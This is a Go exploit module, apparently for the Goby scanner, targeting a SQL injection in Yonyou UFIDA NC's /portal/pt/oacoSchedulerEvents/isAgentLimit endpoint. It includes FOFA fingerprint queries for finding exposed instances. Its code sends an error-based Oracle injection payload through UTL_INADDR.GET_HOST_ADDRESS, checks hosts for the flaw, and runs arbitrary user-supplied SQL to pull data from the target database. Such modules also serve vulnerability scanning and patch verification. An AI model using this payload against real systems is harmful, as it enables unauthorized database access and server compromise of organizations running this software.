package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou-UFIDA-NC /portal/pt/oacoSchedulerEvents/isAgentLimit SQL Injection Vulnerability",
    "Description": "<p>Yonyou-UFIDA-NC is a comprehensive enterprise resource planning software solution for managing all aspects of the enterprise, including finance, human resources, supply chain, production and sales.</p><p>Yonyou-UFIDA-NC /portal/pt/oacoSchedulerEvents/isAgentLimit has a SQL injection vulnerability through which the attacker can obtain server permissions after writing on the server side and then control the entire web server.</p>",
    "Product": "yonyou-UFIDA-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-05-09",
    "PostTime": "2024-06-12",
    "Author": "Town",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (body=\"/Client/Uclient/UClient.exe\" && title==\"Yonyou UAP\")",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (body=\"/Client/Uclient/UClient.exe\" && title==\"Yonyou UAP\")",
    "Level": "3",
    "Impact": "<p>Yonyou NC /portal/pt/oacoSchedulerEvents/isAgentLimit has a SQL injection vulnerability through which the attacker can obtain server permissions after writing on the server side and then control the entire web server.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "createSelect",
            "value": "SELECT * FROM v$version WHERE rownum=1,select user from dual",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|'([^']*)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": " 用友-UFIDA-NC /portal/pt/oacoSchedulerEvents/isAgentLimit SQL 注入漏洞",
            "Product": "用友-UFIDA-NC",
            "Description": "<p>用友NC是一套全面的企业资源规划软件解决方案，用于管理企业的各个方面，包括财务、人力资源、供应链、生产和销售等。&nbsp;</p><p>用友NC /portal/pt/oacoSchedulerEvents/isAgentLimit 存在SQL注入漏洞，攻击者可通过该漏洞在服务器端写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><a href=\"http://www.its365.net/products.aspx/\"></a><a href=\"https://www.longshine.com/\"></a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>用友NC /portal/pt/oacoSchedulerEvents/isAgentLimit 存在SQL注入漏洞，攻击者可通过该漏洞在服务器端写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yonyou-UFIDA-NC /portal/pt/oacoSchedulerEvents/isAgentLimit SQL Injection Vulnerability",
            "Product": "yonyou-UFIDA-NC",
            "Description": "<p>Yonyou-UFIDA-NC is a comprehensive enterprise resource planning software solution for managing all aspects of the enterprise, including finance, human resources, supply chain, production and sales.</p><p>Yonyou-UFIDA-NC /portal/pt/oacoSchedulerEvents/isAgentLimit has a SQL injection vulnerability through which the attacker can obtain server permissions after writing on the server side and then control the entire web server.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Yonyou NC /portal/pt/oacoSchedulerEvents/isAgentLimit has a SQL injection vulnerability through which the attacker can obtain server permissions after writing on the server side and then control the entire web server.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10960"
}`

	sendPayloadiwtmaxqp := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/portal/pt/oacoSchedulerEvents/isAgentLimit`
		payloadConfig := httpclient.NewPostRequestConfig(uri)
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Data = "pageId=login&pk_flowagent=1' AND 2=UTL_INADDR.GET_HOST_ADDRESS('~'||(" + sql + ")||'~')--"

		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 200")
		}
		return resp, err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloadiwtmaxqp
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := goutils.RandomHexString(8)
			resp, err := sendPayload(hostInfo, "'"+sql+"'")
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "~"+sql+"~") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/portal/pt/oacoSchedulerEvents/isAgentLimit`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloadiwtmaxqp
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, `ORA-[0-9]+:.*~(.*?)~`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /portal/pt/oacoSchedulerEvents/isAgentLimit HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Connection: close

pageId=login&pk_flowagent=1' AND 2=UTL_INADDR.GET_HOST_ADDRESS('~'||(` + sql + `)||'~')--`
			}
			return expResult
		},
	))
}
